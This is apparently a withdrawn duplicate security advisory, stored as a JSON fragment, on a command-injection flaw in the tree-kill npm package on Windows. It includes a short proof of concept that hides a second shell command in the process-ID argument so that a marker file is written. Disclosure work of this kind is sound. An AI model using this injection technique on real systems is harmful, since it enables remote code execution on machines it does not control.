  "summary": "Duplicate Advisory: tree-kill vulnerable to remote code execution",
  "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-884p-74jh-xrg2. Ths link is maintained to preserve external references.\n\n## Original Description\nA Code Injection exists in tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command, which is executed without any check. The issue arises here: `https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20` . While the Linux part is sanitized, the Windows on simply uses the `+` operand to concatenate the input into `exec()`\n\n### Steps To Reproduce:\n\nCreate the following PoC file:\n\n```js\n// poc.js\nvar kill = require('tree-kill');\nkill('3333332 & echo \"HACKED\" > HACKED.txt & ');\n```\nExecute the following commands in another terminal:\n\n```bash\nnpm i tree-kill # Install affected module\ndir # Check *HACKED.txt* doesn't exist\nnode poc.js #  Run the PoC\ndir # Now *HACKED.txt* exists :)\n```\n\nA new file called `HACKED.txt` will be created, containing the `HACKED` string.",
